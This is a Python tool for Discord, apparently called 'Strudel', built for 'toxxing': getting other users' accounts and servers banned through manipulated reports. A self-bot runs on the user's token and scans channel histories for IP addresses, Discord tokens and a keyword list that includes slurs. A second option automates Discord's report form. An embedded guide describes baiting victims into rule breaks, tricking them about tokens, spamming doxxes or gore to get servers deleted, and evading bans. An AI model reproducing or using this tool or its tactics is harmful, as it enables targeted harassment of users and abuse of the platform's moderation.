# https://sites.google.com/chromium.org/driver/?pli=1 | Download chrome driver here

import aiosonic; import asyncio; from selenium import webdriver; import chromedriver_binary; import time;
from selenium.common.exceptions import TimeoutException; from selenium.webdriver.support.ui import WebDriverWait;
from selenium.webdriver.support import expected_conditions as EC; from selenium.webdriver.common.by import By; import re;
#Discord.py version must be discord.py==1.7.3
def black(): return '\u001b[30;1m';
def red(): return '\u001b[31;1m';
def green(): return '\u001b[32;1m';
def yellow(): return '\u001b[33;1m';
def blue(): return '\u001b[34;1m';
def magenta(): return '\u001b[35;1m';
def cyan(): return '\u001b[36;1m';
def white(): return '\u001b[37;1m';
def reset(): return '\u001b[0m';
def b_black(): return '\u001b[40;1m';
def b_red(): return '\u001b[41;1m';
def b_green(): return '\u001b[42;1m';
def b_yellow(): return '\u001b[43;1m';
def b_blue(): return '\u001b[44;1m';
def b_magenta(): return '\u001b[45;1m';
def b_cyan(): return '\u001b[46;1m';
def b_white(): return '\u001b[47;1m';

class SuperSpecial:
    def __init__(self) -> None:
        print("""

     
     ▄████████     ███        ▄████████ ███    █▄  ████████▄     ▄████████  ▄█       
    ███    ███ ▀█████████▄   ███    ███ ███    ███ ███   ▀███   ███    ███ ███       
    ███    █▀     ▀███▀▀██   ███    ███ ███    ███ ███    ███   ███    █▀  ███       
    ███            ███   ▀  ▄███▄▄▄▄██▀ ███    ███ ███    ███  ▄███▄▄▄     ███       
  ▀███████████     ███     ▀▀███▀▀▀▀▀   ███    ███ ███    ███ ▀▀███▀▀▀     ███       
           ███     ███     ▀███████████ ███    ███ ███    ███   ███    █▄  ███       
     ▄█    ███     ███       ███    ███ ███    ███ ███   ▄███   ███    ███ ███▌    ▄ 
   ▄████████▀     ▄████▀     ███    ███ ████████▀  ████████▀    ██████████ █████▄▄██ 
                            ███    ███                                    ▀         

"""); 
        pass;
    def __del__(self) -> None:
        print("Hope you enjoyed.");
        pass;
    def api_report(self):
        print("[https://github.com/Takaso/Aos-Toxxer-Mass-reporter] - API Report is not recommended, since it won't likely work");
    def discord_py(self):
        loop = asyncio.get_event_loop();
        try:
            token = input("[Insert your discord token] > ");
            import discord; from discord.ext import commands;
            client = commands.Bot(command_prefix="/", self_bot=True);
            @client.event
            async def on_ready():
                print("[Type /scan in the channel you want to scan]"); print("[/scan 'channel_id' also works]"); print("[Type /guide for a guide]"); print("[Type /exit to exit]");
            @client.command()
            async def guide(ctx):
                await ctx.message.delete();
                await ctx.send("""
1. TOS Opening

> Discord TOS open at 17:00 British Time and this is when all reports get read.
> This is the time when you will probably get responce so toxxing hour or two before it always works

2. Getting faster responce

> If you add bigger description and put more than 1 message link there and some IDs your tox will get replied faster.

3. CP Terming Method

> Report to lawenforce@discord.com thought a normal mail if there are cases of pedophiles

4.  GC Tox method

4.1 > With your friend/alt make the victim to send a fake dox then kick him and tox
4.2 > Ignite a fight and make the victim say anti TOS things
4.3 > Make an alt called "Send token" and use font in it then make gc with the victim and ask him to read your name then just kick him


5. Prevent getting disabled
> When you feel like you are getting toxxed and will get disabled - disable the account then when the report is read the account will already be disabled then just appeal it to get it back

6. Terming servers
> In the description put "The server...." so it only mention the server, this should get it deleted
> Or spam doxxes/gore in the server

7. Causing a banwave/warnwave
> Spam a lot doxxes or gore so it looks like the server is dedicated to such things. Make sure the mod is in good mood. ( Look 8.)
> Keep in mind banwaving is not very easy and wont always work

8. If you don't get reply ( PATCHED, WONT WORK )
> If you don't get replies often and like get them the next day - submit the report twice or more times so different moderators check it out ( dont spam it like 10 or 20 times like 5 max, 2 is recommended)
""");
            @client.command()
            async def exit(ctx):
                await ctx.message.delete(); await client.close();
                try: client.logout();
                except: pass;
            ipregex = r'(\b25[0-5]|\b2[0-4][0-9]|\b[01]?[0-9][0-9]?)(\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}';
            regexes = (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', ipregex, r'mfa\.[\w-]{84}');
            @client.command(aliases=["s"])
            async def scan(ctx, chan_id=None, redirect=False):
                print("Starting.");
                def process_headers(head, list):
                    a = list; str = head.split(); found = False;
                    for item in a:
                        if item in str: found = True;
                    if found: return True;
                    else: return False;
                toxxlist = ['@gmail.com', 'kys', 'kill yourself', 'dox', 'password', '@protonmail.com', 'nigger', 'faggot', 'child porn', 'groom children', 'heil hitler', 'doxxed', 'doxxing', 'token', 'ip', 'ip address', 'doxbin', 'gore', 'nazi', 'white power', '@hotmail', '@yahoo', '@tiscali', '@alice', 'raid', 'nuke', 'selfbot', 'wizz', 'hack', 'breach', 'database', 'furries', 'furry', 'pedo', 'pedophile', 'jew', 'heil', 'niggers', 'children', 'kid', 'cp', 'tox', 'toxxing', 'pedophilia', 'selfbot', 'self bot', 'sb', 'spam', 'raiders', '12','im 12', 'im 11', '11', '10', 'go hang', 'suicide']
                await ctx.message.delete();
                if chan_id==None: disb = ctx.channel;
                else: disb = await client.fetch_channel(chan_id);
                chid = disb.id; badwords:int = 0; ips:int = 0; tokens:int = 0;
                try: guid = ctx.guild.id;
                except: guid = "@me";
                async for message in disb.history(limit=None):
                    if message.author != client.user:
                        if len(re.findall(ipregex, message.content)) != 0:
                            x = f"[] https://discord.com/channels/{guid}/{chid}/{message.id} -  {message.author} : {message.content}"
                            if redirect==False: print(x);
                            else: await ctx.send(x);
                            ips+=1
                        elif len(re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', message.content)) != 0: 
                            x = f"[] https://discord.com/channels/{guid}/{chid}/{message.id} -  {message.author} : {message.content}"
                            if redirect==False: print(x);
                            else: await ctx.send(x);
                            tokens+=1;
                        elif len(re.findall( r'mfa\.[\w-]{84}', message.content)) != 0:
                            x = f"[] https://discord.com/channels/{guid}/{chid}/{message.id} -  {message.author} : {message.content}"
                            if redirect==False: print(x);
                            else: await ctx.send(x);
                            tokens+=1;
                        else:
                            if process_headers(message.content.lower(), toxxlist):
                                x = f"[] https://discord.com/channels/{guid}/{chid}/{message.id} -  {message.author} : {message.content}"
                                if redirect==False: print(x);
                                else: await ctx.send(x);
                                badwords = badwords+1;
                amongus = badwords + ips + tokens;
                if amongus == 0: print(f"[No messages found]");
                else: print(f"""
    {red()}Scrape results:{reset()}

    {red()}Bad Words: {white()}{badwords}
    {red()}IPs:{white()} {ips}
    {red()}Tokens:{white()} {tokens}
    {red()}Total:{white()} {amongus}{reset()}

            """);
            loop.create_task(client.start(token, bot=False));
        except Exception as x: print(x);
        finally: print("[Loaded discord client]");
        loop.run_forever();
    def roulette_spin(self):
        opt_ = webdriver.ChromeOptions(); opt_.add_experimental_option("detach", True);
        opt_.add_argument("start-maximized"); opt_.add_experimental_option("excludeSwitches", ["enable-logging"]);
        driver = webdriver.Chrome(options=opt_); 
        driver.get("https://support.discord.com/hc/en-us/requests/new");
        try:
            element_present = EC.presence_of_element_located((By.ID, "new_request"));
            WebDriverWait(driver, 0x3).until(element_present);
        except TimeoutException:
            print("[Timed out waiting for page to load")
        finally: print("[Loaded Page]");
        # Super Special Javascript..
        driver.execute_script("""
function native_val(element, value) {
    const val_set = Object.getOwnPropertyDescriptor(element, \"value\").set;
    const prototype = Object.getPrototypeOf(element);
    const prototypeval_set = Object.getOwnPropertyDescriptor(prototype, \"value\").set;
    if (val_set && val_set !== prototypeval_set) {
      prototypeval_set.call(element, value);
    } else {
      val_set.call(element, value);
    }
};
document.querySelector(\"#new_request > div > a\").click();
document.querySelector(\".nesty-panel > ul > li:nth-child(4)\").click();
/* let x = document.querySelectorAll(\".nesty-panel");
x.forEach(function(y) {
    if (y.textContent == "") {
        console.log(y.textContent);
        y.click();
    }
});
let t = document.querySelector(\"#request_anonymous_requester_email\"); native_val(t, \"any@gmail.com\");
t.dispatchEvent(new Event("input", { bubbles: true }));
*/
document.querySelector("#request_custom_fields_360030385831").click();
alert(\"Fill the fields yourself, since discord makes automation harder\");
""");

x = SuperSpecial();
print(
    "[1] - Report Scanner\n[2] - Email Report\n[3] - Report Spammer"
)
while True:
    _ = str(input("\nChoose an option > "));
    if _ == "1": x.discord_py();
    elif _ == "2": x.roulette_spin();
    elif _ == "3": x.api_report();
    else: print("[Invalid Option]");
